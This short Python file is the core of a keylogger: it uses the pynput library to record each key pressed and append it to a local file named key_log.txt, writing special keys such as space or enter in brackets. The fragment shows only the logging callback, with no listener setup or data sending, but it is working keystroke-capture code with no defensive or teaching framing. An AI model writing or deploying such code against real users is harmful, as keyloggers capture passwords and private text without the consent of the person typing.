import pynput
from pynput import keyboard

key_info = "key_log.txt" # text file for key presses

#Function to log key presses
def Keypress(key):
    print(str(key))
    with open(key_info, "a") as logKey:   #Open log file to append to
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            logKey.write(f"[{str(key).replace('Key.', '')}]") # This is for special keys like space, enter, etc. To make it look more neat, .replace will remove the Key. from the log file
